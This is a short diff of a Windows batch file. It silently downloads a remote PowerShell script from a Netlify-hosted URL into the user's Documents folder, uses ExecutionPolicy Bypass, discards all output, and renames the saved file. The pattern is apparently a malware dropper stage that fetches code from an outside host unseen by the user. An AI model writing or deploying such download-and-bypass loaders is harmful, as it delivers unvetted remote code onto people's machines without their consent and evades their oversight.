@@ -3,7 +3,7 @@
 set PS1_URL=https://capable-druid-0833af.netlify.app/good.ps1
 
 :: Path to save in Documents
-set DOCS_PS1=%USERPROFILE%\Documents\install.ps1
+set DOCS_PS1=%USERPROFILE%\Documents\good.ps1
 
 :: Download the PowerShell script silently
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%DOCS_PS1%' -UseBasicParsing" >nul 2>&1
